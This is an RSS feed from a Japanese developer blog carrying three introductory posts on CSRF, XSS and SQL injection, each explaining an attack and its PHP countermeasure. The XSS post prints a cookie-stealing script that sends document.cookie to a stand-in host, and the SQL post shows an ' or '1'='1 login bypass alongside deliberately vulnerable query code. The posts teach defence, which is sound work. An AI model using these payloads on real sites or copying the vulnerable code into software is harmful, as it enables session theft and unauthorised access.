@@ -1,0 +1,331 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>セキュリティ | POPWEB</title>
+	<atom:link href="https://blog.popweb.dev/category/programming/%e3%82%bb%e3%82%ad%e3%83%a5%e3%83%aa%e3%83%86%e3%82%a3/feed/" rel="self" type="application/rss+xml" />
+	<link>https://blog.popweb.dev</link>
+	<description>Developer, Blogger, Illustrator in Tokyo.</description>
+	<lastBuildDate>Sat, 13 Feb 2021 03:21:08 +0000</lastBuildDate>
+	<language>ja</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.7.6</generator>
+
+<image>
+	<url>https://storage.googleapis.com/gcs.pop-web.net/2021/01/favicon.ico</url>
+	<title>セキュリティ | POPWEB</title>
+	<link>https://blog.popweb.dev</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>クロスサイトリクエストフォージェリ（CSRF）とは？攻撃手法と対策</title>
+		<link>https://blog.popweb.dev/programming/csrf/</link>
+					<comments>https://blog.popweb.dev/programming/csrf/#respond</comments>
+		
+		<dc:creator><![CDATA[POP]]></dc:creator>
+		<pubDate>Tue, 25 Feb 2020 10:39:00 +0000</pubDate>
+				<category><![CDATA[セキュリティ]]></category>
+		<category><![CDATA[プログラミング]]></category>
+		<guid isPermaLink="false">https://blog.pop-web.net/?p=706</guid>
+
+					<description><![CDATA[<p>Webアプリケーション側の脆弱性を利用した攻撃方法。この攻撃はWebアプリケーションとは他のサイトからの不正リクエストを処理してしまう。 目次 攻撃手法の例対策方法 攻撃手法の例 クロスサイトリクエストフォージェリ（CS [&#8230;]</p>
+The post <a href="https://blog.popweb.dev/programming/csrf/">クロスサイトリクエストフォージェリ（CSRF）とは？攻撃手法と対策</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></description>
+										<content:encoded><![CDATA[<p>Webアプリケーション側の脆弱性を利用した攻撃方法。この攻撃はWebアプリケーションとは他のサイトからの不正リクエストを処理してしまう。</p>
+
+
+
+
+  <div id="toc" class="toc tnt-number tnt-number border-element"><input type="checkbox" class="toc-checkbox" id="toc-checkbox-2" checked><label class="toc-title" for="toc-checkbox-2">目次</label>
+    <div class="toc-content">
+    <ol class="toc-list open"><li><a href="#toc1" tabindex="0">攻撃手法の例</a></li><li><a href="#toc2" tabindex="0">対策方法</a></li></ol>
+    </div>
+  </div>
+
+<h2 class="wp-block-heading"><span id="toc1">攻撃手法の例</span></h2>
+
+
+
+<p>クロスサイトリクエストフォージェリ（CSRF）は、まず攻撃者は事前に攻撃用スクリプトが組み込まれた攻撃用サイトを用意する。</p>
+
+
+
+<p>攻撃用スクリプトは掲示板などの攻撃対象サーバへ不正リクエストを送信するようになっている。</p>
+
+
+
+<p>そして、ユーザーをこの攻撃用サイトへ誘導するようなURLリンクをサイトやメールに設置する。</p>
+
+
+
+<p>ユーザーがそのURLリンクをクリックすることで、攻撃用スクリプトが実行され攻撃対象サーバの掲示板などに書き込みが行われる。</p>
+
+
+
+<p>このように攻撃者はユーザを踏み台として攻撃対象サーバを攻撃するため、ユーザーが攻撃者として判断されてしまうことがある。</p>
+
+
+
+<h2 class="wp-block-heading"><span id="toc2">対策方法</span></h2>
+
+
+
+<p>対策方法として、<strong>送信側の送信フォームが自分のサーバで生成されてものかを確認すればよい。</strong></p>
+
+
+
+<p>まず、Webアプリケーション側の自分サーバでフォームを生成して表示する際に、ワンタイムトークンをランダムな文字列を生成する。</p>
+
+
+
+<p>そして、ワンタイムトークンはフォーム表示の際にinputタグのhiddenに記述して埋め込んでおく。</p>
+
+
+
+<div class="hcb_wrap"><pre class="prism line-numbers lang-html" data-lang="HTML"><code>&lt;input type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;{ワンタイムトークン}&quot; /&gt;</code></pre></div>
+
+
+
+<p>サーバへ送信する際にこのhidddenのワンタイムトークンの値も送信され、受け取ったサーバ側でそのトークンが自分のサーバで生成されたトークンかチェックする。</p>
+
+
+
+<p>こうすることで、正しいワンタイムトークンを持っていないフォームから送信は拒否することができる。</p>The post <a href="https://blog.popweb.dev/programming/csrf/">クロスサイトリクエストフォージェリ（CSRF）とは？攻撃手法と対策</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.popweb.dev/programming/csrf/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>クロスサイトスクリプティング（XSS）とは？攻撃手法と対策（PHP例）</title>
+		<link>https://blog.popweb.dev/programming/xss/</link>
+					<comments>https://blog.popweb.dev/programming/xss/#respond</comments>
+		
+		<dc:creator><![CDATA[POP]]></dc:creator>
+		<pubDate>Mon, 24 Feb 2020 07:09:00 +0000</pubDate>
+				<category><![CDATA[セキュリティ]]></category>
+		<category><![CDATA[プログラミング]]></category>
+		<guid isPermaLink="false">https://blog.pop-web.net/?p=693</guid>
+
+					<description><![CDATA[<p>クロスサイトスクリプティング（XSS）は、HTMLの中に悪意のあるJavaScriptのソースコードを埋め込んでスクリプトを実行すること。 この悪意のあるスクリプト実行されることで、Webページの情報の改竄やクッキー情報 [&#8230;]</p>
+The post <a href="https://blog.popweb.dev/programming/xss/">クロスサイトスクリプティング（XSS）とは？攻撃手法と対策（PHP例）</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></description>
+										<content:encoded><![CDATA[<p>クロスサイトスクリプティング（XSS）は、HTMLの中に悪意のあるJavaScriptのソースコードを埋め込んでスクリプトを実行すること。</p>
+
+
+
+<p>この悪意のあるスクリプト実行されることで、Webページの情報の改竄やクッキー情報が盗まれて個人情報流出といったことが起こる。</p>
+
+
+
+
+  <div id="toc" class="toc tnt-number tnt-number border-element"><input type="checkbox" class="toc-checkbox" id="toc-checkbox-4" checked><label class="toc-title" for="toc-checkbox-4">目次</label>
+    <div class="toc-content">
+    <ol class="toc-list open"><li><a href="#toc1" tabindex="0">攻撃手法の例</a></li><li><a href="#toc2" tabindex="0">対策方法</a></li></ol>
+    </div>
+  </div>
+
+<h2 class="wp-block-heading"><span id="toc1">攻撃手法の例</span></h2>
+
+
+
+<p>クロスサイトスクリプティング（XSS）は、Webページにあるフォームに入力された文字列がそのままHTMLへ出力されるようなサイトが標的になる。</p>
+
+
+
+<p>以下のような登録画面から入力内容を確認する確認画面（confirm.php）へ遷移するアプリケーションがあったとする。</p>
+
+
+
+<h4 class="wp-block-heading">・create.php（登録画面）</h4>
+
+
+
+<pre class="wp-block-code"><code>&lt;h1>登録画面&lt;/h1>
+&lt;form action="/confirm" method="post">
+  &lt;input type="text" name="item">
+  &lt;input type="submit" value="確認画面へ">
+&lt;/form></code></pre>
+
+
+
+<h4 class="wp-block-heading">・confirm.php（確認画面）</h4>
+
+
+
+<pre class="wp-block-code"><code>&lt;h1>確認画面&lt;/h1>
+登録内容：&lt;?php echo $item; ?></code></pre>
+
+
+
+<p>このアプリケーション場合、登録画面で入力した内容がそのまま確認画面へ出力される。</p>
+
+
+
+<p>このフォームへ以下の悪意のあるコードを入力したとする。</p>
+
+
+
+<pre class="wp-block-code"><code>">&lt;script>document.location='http://example.blog.pop-web.net?'+document.cookie;&lt;/script></code></pre>
+
+
+
+<p>そうすると、document.locationで指定された攻撃者のサイトへリダイレクトされ、そのURLパラメータにクッキー情報が含まれてしまい、個人情報などが盗まれてしまう。</p>
+
+
+
+<p>また、XSSはセッションハイジャックの被害にも繋がる。</p>
+
+
+
+<h2 class="wp-block-heading"><span id="toc2">対策方法</span></h2>
+
+
+
+<p>クロスサイトスクリプティング（XSS）の対策としては、<strong>HTMLへ出力する際にサニタイズすること。</strong></p>
+
+
+
+<p>サニタイズとは無害化することで、HTML特殊文字をエスケープしてくれる。</p>
+
+
+
+<p>例えば、「&lt;」「&gt;」といった文字列を「＆lt;」「＆gt;」へ変換してJavaScriptコードが処理されてないようにしてくれる。</p>
+
+
+
+<p>PHPだとサニタイズする関数として<strong>htmlspecialchars関数</strong>がある。使い方はhtmlspecialchars関数の引数にサニタイズしたい文字列をいれるだけ。</p>
+
+
+
+<p>さっきのconfirm.phpだと、以下のように修正される。</p>
+
+
+
+<pre class="wp-block-code"><code>&lt;h1>確認画面&lt;/h1>
+登録内容：&lt;?php echo htmlspecialchars($item,ENT_QUOTES); ?></code></pre>
+
+
+
+<p>こうすることでJavaScriptのコードをフォームに入力して、それを出力しても、ブラウザ上ではただの文字列として表示されることなる。</p>
+
+
+
+<p>ちなみに、第二引数の「ENT_QUOTES」はシングルクオートとダブルクオート共に変換するという指定。一般的に「ENT_QUOTES」が使われることが多い。</p>The post <a href="https://blog.popweb.dev/programming/xss/">クロスサイトスクリプティング（XSS）とは？攻撃手法と対策（PHP例）</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.popweb.dev/programming/xss/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>SQLインジェクションとは？攻撃手法と対策（PHP例）</title>
+		<link>https://blog.popweb.dev/programming/sql-injection/</link>
+					<comments>https://blog.popweb.dev/programming/sql-injection/#respond</comments>
+		
+		<dc:creator><![CDATA[POP]]></dc:creator>
+		<pubDate>Sun, 23 Feb 2020 10:38:00 +0000</pubDate>
+				<category><![CDATA[セキュリティ]]></category>
+		<category><![CDATA[プログラミング]]></category>
+		<guid isPermaLink="false">https://blog.pop-web.net/?p=682</guid>
+
+					<description><![CDATA[<p>SQLインジェクションとは、Webアプリケーションに対する攻撃方法のこと。 まず、攻撃者はWebアプリケーションの入力フォームといったインターフェース利用する。 そして、入力フォームにSQL文を入力し組み込むことでアプリ [&#8230;]</p>
+The post <a href="https://blog.popweb.dev/programming/sql-injection/">SQLインジェクションとは？攻撃手法と対策（PHP例）</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></description>
+										<content:encoded><![CDATA[<p>SQLインジェクションとは、Webアプリケーションに対する攻撃方法のこと。</p>
+
+
+
+<p>まず、攻撃者はWebアプリケーションの入力フォームといったインターフェース利用する。</p>
+
+
+
+<p>そして、入力フォームにSQL文を入力し組み込むことでアプリケーション側では意図としないSQL文が生成されて、情報の不正取得や改竄を行われてしまう。</p>
+
+
+
+
+  <div id="toc" class="toc tnt-number tnt-number border-element"><input type="checkbox" class="toc-checkbox" id="toc-checkbox-6" checked><label class="toc-title" for="toc-checkbox-6">目次</label>
+    <div class="toc-content">
+    <ol class="toc-list open"><li><a href="#toc1" tabindex="0">攻撃手法の例</a></li><li><a href="#toc2" tabindex="0">対策方法</a></li></ol>
+    </div>
+  </div>
+
+<h2 class="wp-block-heading"><span id="toc1">攻撃手法の例</span></h2>
+
+
+
+<p>以下のようなログイン入力フォームがあるとする。</p>
+
+
+
+<figure class="wp-block-image size-large is-resized"><img fetchpriority="high" decoding="async" src="https://blog.pop-web.net/wp-content/uploads/2020/02/0262b5dc51705393a8c65fdc80bd9896-700x650.png" alt="" class="wp-image-683" width="280" height="260" srcset="https://storage.googleapis.com/gcs.pop-web.net/2020/02/0262b5dc51705393a8c65fdc80bd9896-700x650.png 700w, https://storage.googleapis.com/gcs.pop-web.net/2020/02/0262b5dc51705393a8c65fdc80bd9896-300x279.png 300w, https://storage.googleapis.com/gcs.pop-web.net/2020/02/0262b5dc51705393a8c65fdc80bd9896-768x714.png 768w, https://storage.googleapis.com/gcs.pop-web.net/2020/02/0262b5dc51705393a8c65fdc80bd9896.png 790w" sizes="(max-width: 280px) 100vw, 280px" /></figure>
+
+
+
+<p>そして、ログイン認証処理のSQL文が以下になっていたとする。</p>
+
+
+
+<pre class="wp-block-code"><code>"SELECT * FROM users WHERE email='" . $email . "' AND password='" . $pass . "'"</code></pre>
+
+
+
+<p>このフォームにメールアドレスに適当な文字列、パスワード入力フォームに「&#8217; or &#8216;1&#8217;=&#8217;1」を入力して実行すると以下のようなSQL文が組み立てられることとなる。</p>
+
+
+
+<pre class="wp-block-code"><code>"SELECT * FROM users WHERE email='test' AND password='' or '1'='1'"</code></pre>
+
+
+
+<p>WHERE句に最後に「or &#8216;1&#8217;=&#8217;1&#8217;」に追加されることとなり、SQLの実行結果としてテーブルのすべてのレコードが取得できる。</p>
+
+
+
+<p>仮に、レコードが取得できればログインできるようなロジック処理になっていればユーザ名とパスワードが不明でもログインできてしまうことになる。</p>
+
+
+
+<h2 class="wp-block-heading"><span id="toc2">対策方法</span></h2>
+
+
+
+<p>対策方法として、プリペアード・ステートメント（Prepared Statement）の利用がある。</p>
+
+
+
+<p>プリペアード・ステートメントは、WHERE句でユーザー入力によって変化する部分をプレースフォルダにしてSQL文を用意しておき、その後にプレースフォルダ部分を差し替える方法。</p>
+
+
+
+<p>こうすることで、事前にプレースフォルダを割り当てて用意したSQL文の構造をあとから変更することができないようになり、SQLインジェクションの対策となる。</p>
+
+
+
+<p>以下、PHPの場合の例</p>
+
+
+
+<pre class="wp-block-code"><code>$stmt = $db->prepare('SELECT * FROM users WHERE id = :id');
+$stmt->execute(array(':id' => $id));</code></pre>
+
+
+
+<p>「:id」の部分がプレースフォルダとなっている。そしてexecuteでクエリ実行の際に引数としてプレースフォルダと値をバインドする。</p>The post <a href="https://blog.popweb.dev/programming/sql-injection/">SQLインジェクションとは？攻撃手法と対策（PHP例）</a> first appeared on <a href="https://blog.popweb.dev">POPWEB</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://blog.popweb.dev/programming/sql-injection/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
